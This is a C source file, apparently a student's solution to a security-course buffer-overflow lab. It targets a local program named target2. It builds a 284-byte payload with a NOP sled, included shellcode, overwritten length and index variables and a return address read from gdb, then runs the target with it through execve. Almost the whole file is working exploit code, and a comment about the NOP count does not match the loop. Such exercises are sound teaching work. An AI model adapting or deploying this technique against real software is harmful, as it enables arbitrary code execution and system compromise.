#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode-64.h"

#define TARGET "../targets/target2"


/*      (gdb) info frame [foo]
        Stack level 0, frame at 0x2021ff00:
        rip = 0x400c25 in foo (target2.c:11); saved rip = 0x400dbf
        called by frame at 0x2021ff30
        source language c.
        Arglist at 0x2021fef0, args: arg=0x7fffffffe981 "test"
        Locals at 0x2021fef0, Previous frame's sp is 0x2021ff00
        Saved registers:
        rbp at 0x2021fef0, rip at 0x2021fef8

        (gdb) p &buf
        $1 = (char (*)[256]) 0x2021fde0
        //decimal: (539098592)

        (gdb) p &len
        $2 = (int *) 0x2021fee8
        //decimal: (539098856)

        (gdb) p &i
        $3 = (int *) 0x2021feec
        //decimal: (539098860)
        
        The environment variables are stored in the top of the stack when the
        program is started, any modification by setenv() are then allocated
        elsewhere.  The stack at the beginning then looks like this:


              <strings><argv pointers>NULL<envp pointers>NULL<argc><argv><envp>
*/

int
main ( int argc, char * argv[] )
{
	char *	args[3];
	char *	env[1];

    /*
	args[0] = TARGET;
	args[1] = "hi there";
	args[2] = NULL;

	env[0] = NULL;
    */
    int i;
    char    buf[284];

	args[0] = TARGET;

    // Pad beginning with 18 NOP's ('\x90')
    // We use 18 because the shellcode is 46 bytes
    // 18+46 = 64 which will keep the buf byte aligned
    for (i = 0 ; i < 83; i++)
        buf[i] = '\x90';

    // Copy shellcode into buf
    for (; i < 128; i++)
        buf[i] = shellcode[i-83];

    // NOPs between shellcode and 
    for (; i < 264; i++)
        buf[i] = '\x90';

    // write '283' to len starting at buf[264]
    for (; i < 268; i = i+4) {
        buf[i+3] = '\x90';
        buf[i+2] = '\x00';
        buf[i+1] = '\x01';
        buf[i]   = '\x1b';
    }
   // buf[267] = '\x00';

    // write '264' to i 
    for (; i < 272; i = i+4) {
        buf[i+3] = '\x00';
        buf[i+2] = '\x00';
        buf[i+1] = '\x01';
        buf[i]   = '\x0c';
    }

    // Return address of 'buf' is 0x2021fde0
    // (determined by checking gdb)
    for (; i < 284; i = i+4) {
        buf[i+3] = '\x20';
        buf[i+2] = '\x21';
        buf[i+1] = '\xfd';
        buf[i]   = '\xe0';
    }

    args[1] = buf;
	args[2] = NULL;
	//env[0] = '\x00';
    env[0] = "\x0c\x01\x90\x90\xe0\xfd\x21\x20";

	if ( execve (TARGET, args, env) < 0 )
		fprintf (stderr, "execve failed.\n");

	return (0);
}
